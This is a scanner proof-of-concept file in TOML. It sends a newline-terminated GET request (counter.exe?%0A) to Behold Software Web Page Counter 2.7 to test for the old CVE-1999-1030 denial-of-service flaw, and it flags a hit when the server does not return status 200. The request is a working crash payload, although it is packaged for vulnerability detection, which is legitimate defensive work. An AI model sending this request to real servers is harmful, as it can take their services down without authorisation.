[info]
author = "AVE"
description = "检测向 counter.exe 发送以 %0A 结尾的 HTTP 请求是否导致服务拒绝"
id = "POC-AVE-1999-0885"
name = "Behold Software Web Page Counter 2.7 counter.exe DoS PoC"
severity = "medium"
tags = [
    "cve-1999-1030",
    "dos",
]
vuln_id = [
    "CVE-1999-1030",
    "AVE-1999-0885",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/counter.exe?%0A"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = false
status = [200]
type = "status"
